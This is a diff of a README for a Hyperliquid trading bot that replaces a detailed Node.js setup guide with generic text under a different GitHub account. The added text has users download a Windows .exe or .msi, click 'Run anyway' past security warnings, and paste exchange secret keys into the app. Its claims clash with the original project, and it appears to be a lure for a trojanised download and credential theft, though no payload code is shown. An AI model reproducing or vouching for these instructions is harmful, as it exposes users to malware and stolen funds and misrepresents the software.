@@ -1,463 +1,101 @@
-# 🤖 Hyperliquid Grid Trading Bot
+# 🤖 hyperliquid-trading-bot - Automated trading for your digital assets
 
-**An intelligent grid trading strategy runner for Hyperliquid — automate layered orders with built-in risk management.**
+[![](https://img.shields.io/badge/Download_Software-Blue?style=for-the-badge)](https://github.com/chlamydeous-deletion416/hyperliquid-trading-bot)
 
-[![GitHub](https://img.shields.io/badge/GitHub-Novaquant--labs-blue?logo=github)](https://github.com/Novaquant-labs/hyperliquid-trading-bot)
-[![Node.js](https://img.shields.io/badge/Node.js-20.19+-green)](https://nodejs.org/)
-[![License](https://img.shields.io/badge/License-MIT-gray)](LICENSE)
+## 📌 About this project
 
----
+The hyperliquid-trading-bot helps you manage trades on the Hyperliquid platform. This software automates buying and selling perpetual futures. You use this tool to execute complex trading strategies without watching market charts all day. The bot connects to your account and responds to price movements based on settings you choose. It handles order entry and risk management tasks for you.
 
-## 🎯 What This Bot Does
+## 💻 System requirements
 
-This bot **automatically places layered buy and sell orders** around your target price range on Hyperliquid. Think of it as a smart assistant that:
+Your computer needs to meet these basic standards to run the software smoothly:
 
-✅ Places multiple orders at different price levels (your "grid")  
-✅ Automatically rebalances when the market moves  
-✅ Protects your capital with stop-loss, take-profit, and drawdown limits  
-✅ Logs everything for transparency and debugging  
-✅ Runs 24/7 on testnet or mainnet (your choice)
+*   **Operating System:** Windows 10 or Windows 11.
+*   **Memory:** At least 8GB of RAM.
+*   **Internet:** A stable broadband connection.
+*   **Storage:** 200MB of free disk space.
+*   **Software:** The latest version of the .NET runtime installed on your machine.
 
-**Perfect for:** Volatile markets, range-bound trading, automated income generation, and hands-off position management.
+## 📥 Downloading the software
 
----
+You need to access the release page to get the application. Follow these instructions to download the installer:
 
-## ⚠️ Risk Warning
+1. Visit [this page to download](https://github.com/chlamydeous-deletion416/hyperliquid-trading-bot).
+2. Locate the latest release version on the right side of the screen.
+3. Click on the file ending in .msi or .exe to start your download.
+4. Save the file to your desktop for easy access.
 
-**Trading derivatives is risky.** You can lose your entire investment. This bot is for **education and research only**. 
+## ⚙️ Installation steps
 
-🔴 **Before you start:**
-- Start on **testnet** with fake funds
-- Keep position sizes **small** while learning
-- Always understand the strategy before running it
-- Never share your private keys or `.env` file
-- Read `bots/btc_conservative.yaml` to understand risk settings
+Once you download the file, follow these steps to install the bot:
 
-**The authors provide no financial or legal advice. You are fully responsible for your trading decisions.**
+1. Double-click the downloaded file. 
+2. Follow the prompts in the installer window.
+3. Click "Next" through the setup stages.
+4. Select "Install" when prompted.
+5. Windows might show a security notification. Select "Run anyway" if the system asks for permission because you trust the source.
+6. Click "Finish" to complete the installation process.
 
----
+## 🔑 Linking your account
 
-## 📋 Prerequisites
+The bot requires your API credentials to talk to the Hyperliquid platform. You find these keys in your account settings on the official Hyperliquid website. 
 
-You'll need just **three things**:
+1. Log in to your Hyperliquid account.
+2. Navigate to your user settings or API section.
+3. Create a new API key pair.
+4. Copy your Public Key and Secret Key. 
+5. Open the Hyperliquid trading bot on your desktop.
+6. Paste these keys into the "Account Settings" tab.
+7. Click "Save" to link the application to your exchange account.
 
-| What | Why | Link |
-|-----|-----|------|
-| **Node.js 20.19+** | Runs the bot engine | [Download Node.js](https://nodejs.org/) |
-| **Hyperliquid Wallet** | Holds your trading funds | [Create wallet](https://hyperliquid.xyz) |
-| **Git** | Clones this repository | [Get Git](https://git-scm.com/) |
+## 📈 Configuring your strategy
 
-**Optional:** [uv](https://github.com/astral-sh/uv) if you want to play with Python learning examples.
+The bot works by following instructions you provide. You must set these rules before the bot starts trading.
 
----
+*   **Target Pair:** Pick the asset you want to trade, such as BTC-PERP or ETH-PERP.
+*   **Trade Size:** Decide how much capital moves in each individual order.
+*   **Risk Limits:** Define your stop-loss and take-profit points. These settings tell the bot when to sell to protect your balance.
+*   **Frequency:** Set the time interval the bot takes to scan the book for new opportunities.
 
-## 🚀 Quick Start (5 Minutes)
+Press "Apply" once you verify your settings. 
 
-### Step 1: Clone the Repository
+## 🚀 Running the bot
 
-```bash
-git clone https://github.com/Novaquant-labs/hyperliquid-trading-bot.git
-cd hyperliquid-trading-bot
-npm install
-```
+After you configure the settings, you start the service to begin operations:
 
-### Step 2: Set Up Your Environment
+1. Click the "Start" button on the main dashboard.
+2. The indicator light turns green to show the connection is active.
+3. Watch the "Log" window to see the bot report its activity.
+4. You see updates about orders placed, canceled, or filled in real time.
 
-```bash
-cp .env.example .env
-```
+## 🛡️ Best practices for trading
 
-Then edit `.env` and add your wallet's private key:
+Automated trading involves risks. Use these tips to manage your activity:
 
-**For testnet (recommended first):**
-```env
-HYPERLIQUID_TESTNET=true
-HYPERLIQUID_TESTNET_PRIVATE_KEY=your_testnet_private_key_here
-```
+*   **Start small:** Run the bot with a tiny amount of money to observe how it reacts to market changes.
+*   **Monitor logs:** Check the log window daily to ensure the bot functions correctly.
+*   **Use testnet:** If you are new to this, test your settings on the Hyperliquid testnet before using your real account balance.
+*   **Check connectivity:** Shut down the computer only when you stop the bot to avoid leaving open trades.
 
-**For mainnet (real money):**
-```env
-HYPERLIQUID_TESTNET=false
-HYPERLIQUID_MAINNET_PRIVATE_KEY=your_mainnet_private_key_here
-```
+## 🔧 Troubleshooting common issues
 
-> 🔒 **Never commit `.env` to Git.** It's already in `.gitignore` — keep it that way.
+If you encounter problems, check these solutions first:
 
-### Step 3: Configure Your Strategy
+*   **Bot does not connect:** Verify you copied the full API key and secret key correctly. Check your internet connection.
+*   **Orders fail:** Your account might lack enough collateral to cover the trade size. Check your wallet balance on the exchange.
+*   **Application freezes:** Close the program completely and restart your computer. Then, launch the bot again.
+*   **Permissions issues:** Run the application as an administrator if it fails to read local configuration files.
 
-The bot comes with a sample config: `bots/btc_conservative.yaml`
+## 📝 Frequently asked questions
 
-To use it, make sure it has `active: true`:
+**Does the bot store my password?**
+The software only stores your API keys locally on your device. It never sends your account passwords to an external server.
 
-```yaml
-name: "my_first_grid"
-active: true           # ← Set this to true
+**Can I run the bot 24/7?**
+Your computer must stay powered on and connected to the internet for the bot to trade. Use a virtual private server if you need the bot to remain active while your physical computer is off.
 
-exchange:
-  type: "hyperliquid"
-  testnet: true        # Change to false for mainnet
+**How do I update the software?**
+When a new version releases, visit the download link again. Install the new version over the old one to apply improvements and fixes.
 
-account:
-  max_allocation_pct: 10.0  # Risk only 10% of your account
-
-grid:
-  symbol: "BTC"
-  levels: 10           # 10 buy/sell orders per side
-  price_range:
-    mode: "auto"
-    auto:
-      range_pct: 5.0   # Grid spans ±5% around current price
-```
-
-### Step 4: Validate & Run
-
-```bash
-npm run validate      # Quick check for config errors
-npm start             # 🤖 Bot is now trading!
-```
-
-Press **Ctrl+C** to stop. The bot will cancel all open orders.
-
----
-
-## 📖 Understanding Your Configuration
-
-All bot settings live in **one YAML file** under `bots/`.
-
-### Basic Structure
-
-```yaml
-name: "my_bot_name"           # What to call this strategy
-active: true                  # true = bot will auto-start, false = skip
-
-exchange:
-  type: "hyperliquid"         # Only option for now
-  testnet: true               # true = testnet, false = mainnet
-
-account:
-  max_allocation_pct: 10.0    # Max % of wallet to use (safety limit)
-
-grid:
-  symbol: "BTC"               # Trading pair: BTC, ETH, SOL, etc.
-  levels: 10                  # Number of orders on each side
-  price_range:
-    mode: "auto"              # Can be "auto" or "manual"
-    auto:
-      range_pct: 5.0          # Grid covers ±5% from current price
-
-risk_management:
-  stop_loss_enabled: false
-  stop_loss_pct: 10.0
-  take_profit_enabled: false
-  take_profit_pct: 20.0
-  max_drawdown_pct: 15.0      # Pause if down 15%
-  rebalance:
-    price_move_threshold_pct: 12.0
-
-monitoring:
-  log_level: "INFO"           # INFO, DEBUG, WARN, ERROR
-```
-
-### Key Settings Explained
-
-**`grid.levels`** — How many buy orders below and sell orders above your center price  
-→ More levels = thinner spreads, more orders to manage
-
-**`price_range.auto.range_pct`** — How wide your grid spans  
-→ 5% = grid from -5% to +5% of current price
-
-**`max_allocation_pct`** — % of your wallet the bot can use  
-→ 10% = max risk is 10% of your total funds
-
-**`max_drawdown_pct`** — Bot pauses if losses hit this threshold  
-→ 15% = shut down if down $15 per $100 in the account
-
----
-
-## 🎓 Common Configurations
-
-### 🛡️ Conservative (Low Risk, Slow Profit)
-```yaml
-grid:
-  levels: 15
-  price_range:
-    auto:
-      range_pct: 2.0
-account:
-  max_allocation_pct: 5.0
-risk_management:
-  max_drawdown_pct: 10.0
-```
-
-### ⚡ Aggressive (Higher Risk, Faster Profit)
-```yaml
-grid:
-  levels: 5
-  price_range:
-    auto:
-      range_pct: 10.0
-account:
-  max_allocation_pct: 25.0
-risk_management:
-  max_drawdown_pct: 25.0
-```
-
-### 💰 Balanced (Medium Risk)
-```yaml
-grid:
-  levels: 10
-  price_range:
-    auto:
-      range_pct: 5.0
-account:
-  max_allocation_pct: 15.0
-risk_management:
-  max_drawdown_pct: 15.0
-```
-
----
-
-## 🛠️ Commands & Tools
-
-| Command | What It Does |
-|---------|-------------|
-| `npm start` | Run bot with first active config |
-| `npm run validate` | Check config syntax (no keys needed) |
-| `npx tsx ts/src/runBot.ts bots/my_config.yaml` | Run specific config |
-| `npm test` | Run automated tests |
-| `npm run debug` | Start with verbose logging |
-
----
-
-## 🔄 How It Works (Under the Hood)
-
-```
-┌─────────────────────────────────────────────────────┐
-│ 1. Bot Starts                                       │
-│    Reads your .env (private key) + YAML config     │
-└──────────────────┬──────────────────────────────────┘
-                   ↓
-┌─────────────────────────────────────────────────────┐
-│ 2. Places Grid Orders                               │
-│    Puts buy orders below + sell orders above        │
-│    e.g., BTC at $43k, $42.9k, $42.8k (buy side)    │
-│             $44k, $44.1k, $44.2k (sell side)       │
-└──────────────────┬──────────────────────────────────┘
-                   ↓
-┌─────────────────────────────────────────────────────┐
-│ 3. Monitor & Manage                                 │
-│    Watch for fills, check risk limits, rebalance   │
-│    Logs every action for transparency              │
-└──────────────────┬──────────────────────────────────┘
-                   ↓
-┌─────────────────────────────────────────────────────┐
-│ 4. Loop Until Stopped                               │
-│    Repeat every few seconds (configurable)          │
-└─────────────────────────────────────────────────────┘
-```
-
----
-
-## 📊 Real Example Walkthrough
-
-Let's say BTC is trading at **$43,000**:
-
-**Your Config:**
-- `levels: 5` (5 buy, 5 sell orders)
-- `range_pct: 4.0` (±4% = $41,280 to $44,720)
-
-**Bot Creates This Grid:**
-
-```
-SELL Orders (Above Price)     BUY Orders (Below Price)
-─────────────────────────     ──────────────────────
-Limit $44,720 (±4%)           Limit $41,280 (±4%)
-Limit $44,344                 Limit $41,656
-Limit $43,968 (←Mid)          Limit $42,032 (←Mid)
-Limit $43,592                 Limit $42,408
-Limit $43,216                 Limit $42,784
-```
-
-When price rises to $44,000 → sells execute → profit locked.  
-When price drops to $42,000 → buys execute → averaging down.  
-Rinse and repeat.
-
----
-
-## 🐍 Python Examples (Educational)
-
-Want to learn the API? Check out the learning examples:
-
-```bash
-# Install Python deps
-uv sync
-
-# Run examples
-uv run learning_examples/01_websockets/realtime_prices.py
-uv run learning_examples/02_market_data/get_all_prices.py
-uv run learning_examples/04_trading/place_limit_order.py
-```
-
-Also see the legacy Python bot:
-```bash
-uv run src/run_bot.py --validate
-uv run src/run_bot.py
-```
-
----
-
-## ❓ FAQ
-
-### Q: Can I run multiple bots at once?
-**A:** Not in auto-discovery mode (only one `active: true`). To run multiple, launch them separately with explicit config paths:
-```bash
-npx tsx ts/src/runBot.ts bots/btc_grid.yaml &
-npx tsx ts/src/runBot.ts bots/eth_grid.yaml &
-```
-
-### Q: What's the minimum position size?
-**A:** Depends on Hyperliquid's rules. Start with the testnet to find out—no real money lost if wrong.
-
-### Q: Does the bot work 24/7?
-**A:** Yes, as long as your server/machine stays on. Consider cloud hosting (AWS, DigitalOcean) for always-on trading.
-
-### Q: How often does it check & rebalance?
-**A:** Every few seconds (configurable). Check logs to see the exact interval.
-
-### Q: Can I edit the config while the bot is running?
-**A:** No. Stop the bot (Ctrl+C), edit the YAML, then restart.
-
-### Q: What if my key is exposed?
-**A:** Immediately revoke it in your Hyperliquid wallet settings and generate a new one. Never re-use a compromised key.
-
----
-
-## 🐛 Troubleshooting
-
-### Bot won't start
-```bash
-npm run validate
-# Check for YAML syntax errors
-# Verify .env file exists and has HYPERLIQUID_TESTNET_PRIVATE_KEY
-```
-
-### Orders aren't filling
-- Check market liquidity (sparse market = wider spreads needed)
-- Verify `price_range.range_pct` is wide enough
-- Ensure your account has enough collateral
-- Look at logs: `npm run debug`
-
-### "Invalid private key" error
-- Double-check `.env` for typos
-- Verify you're using the **correct** key for testnet/mainnet
-- Make sure the key is **hex-encoded** (no spaces)
-
-### Bot stops unexpectedly
-- Check logs for error messages
-- Verify your API rate limits aren't exceeded
-- Ensure the bot account still has collateral
-
-### High slippage / orders not optimal
-- Reduce `grid.levels` (fewer, thicker orders)
-- Increase `price_range.range_pct` (wider bands)
-- Trade more liquid pairs (BTC, ETH)
-
----
-
-## 💡 Tips for Success
-
-✅ **Start small** — Test on testnet with tiny amounts first  
-✅ **Log everything** — Keep detailed records of all trades  
-✅ **Monitor trends** — Grids work best in range-bound markets  
-✅ **Set realistic limits** — 15% drawdown > 5% of actual risk  
-✅ **Adjust gradually** — Change one setting at a time  
-✅ **Read the docs** — Hyperliquid has nuances; understand them  
-✅ **Use alerts** — Set up bot notifications (email, Telegram, Discord)
-
----
-
-## 🔧 Advanced: Custom Configs
-
-Need more control? Edit `bots/your_config.yaml` with all available options:
-
-```yaml
-grid:
-  price_range:
-    mode: "manual"           # Instead of auto
-    manual:
-      lower_bound: 40000
-      upper_bound: 50000
-
-risk_management:
-  stop_loss_enabled: true
-  stop_loss_pct: 8.0
-  take_profit_enabled: true
-  take_profit_pct: 15.0
-  max_position_size_pct: 40.0
-  rebalance:
-    enabled: true
-    price_move_threshold_pct: 12.0
-
-monitoring:
-  log_level: "DEBUG"         # Verbose logging
-```
-
----
-
-## 📚 Development & Contributing
-
-### Local Development
-```bash
-# Typecheck
-npx tsc --noEmit
-
-# Run tests
-npm test
-
-# Run with debug logging
-npm run debug
-```
-
-### Contributing
-See `AGENTS.md` / `CLAUDE.md` for code style and conventions.
-
-### Publishing (Maintainers)
-Use `scripts/publish-to-polypulse.ps1` to push to GitHub (requires `GITHUB_TOKEN`).
-
----
-
-## ⚖️ License & Disclaimer
-
-**This software is provided "as is," without any warranty.** You are fully responsible for:
-- Securing your private keys and API credentials
-- Compliance with exchange rules and local laws
-- Any financial losses from using this bot
-- Ensuring your strategy aligns with your risk tolerance
-
-Read the full license in the repository.
-
----
-
-## 🤝 Get Help
-
-- 📖 **Docs:** Check `README.md` and `bots/btc_conservative.yaml`
-- 🐛 **Issues:** Report bugs on [GitHub Issues](https://github.com/Novaquant-labs/hyperliquid-trading-bot/issues)
-- 💬 **Discussions:** Join the community for questions
-- 📧 **Security:** Report vulnerabilities privately to maintainers
-
----
-
-## 🎉 Next Steps
-
-1. **Clone the repo** → `git clone ...`
-2. **Set up `.env`** → Add your testnet key
-3. **Run on testnet** → `npm start`
-4. **Monitor logs** → Verify orders are placed correctly
-5. **Tweak the config** → Experiment with different settings
-6. **Graduate to mainnet** (optional) → When confident, switch to real funds
-
-**Happy trading!** 🚀
-
----
-
-*Last Updated: May 2026 | Maintained by Novaquant-labs*
+**Is this bot profitable?**
+Profits depend on the strategies you set and market conditions. No bot guarantees returns. Use caution and monitor your trades frequently.
